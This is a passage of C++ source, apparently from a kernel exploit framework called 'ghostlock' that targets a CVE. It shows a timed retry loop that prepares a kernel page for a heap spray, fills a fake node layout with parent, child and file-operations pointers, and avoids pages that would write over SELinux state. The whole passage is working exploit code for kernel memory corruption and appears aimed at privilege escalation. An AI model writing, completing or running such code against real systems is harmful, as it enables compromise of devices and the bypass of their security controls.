        deadline.tv_sec += static_cast<time_t>(timeout_ns / 1000000000ULL);
        deadline.tv_nsec += static_cast<long>(timeout_ns % 1000000000ULL);
        if (deadline.tv_nsec >= 1000000000L) {
            deadline.tv_sec++;
            deadline.tv_nsec -= 1000000000L;
        }
        for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
            uintptr_t base = prepare_kernel_page(&request);
            if (base) {
                memory::PayloadWriteLayout layout = {
                    .parent = (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_parent),
                    .right = (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_right),
                    .left = (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_left),
                    .fops = (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_fops),
                };
                if (!payload_write_layout_matches_request(&request, &layout)) {
                    pr_warning("payload arm mismatch preserve_child=%d right=%016zx\n",
                               request.preserve_child, layout.right);
                } else if (!payload_write_layout_accepts_page(&request, &layout)) {
                    pr_warning("page %016zx stores an even byte over "
                               "selinux_state.initialized; taking another\n", base);
                } else {
                    pr_info("prepare_kernel_page ok attempt=%u +%lldms\n", attempt,
                            ms_since(&t_good));
                    return base;
                }
            }
            struct timespec now;
            clock_gettime(CLOCK_MONOTONIC, &now);
            if (now.tv_sec > deadline.tv_sec ||
                (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec)) {
                pr_warning("prepare_kernel_page timeout after %u attempts\n", attempt);
                break;
            }
            pr_warning("prepare_kernel_page retry %u/%u +%lldms\n", attempt,
                       max_attempts, ms_since(&t_good));
        }
        return 0;
    }
} // namespace ghostlock::backend::cve_2026_43499::spray
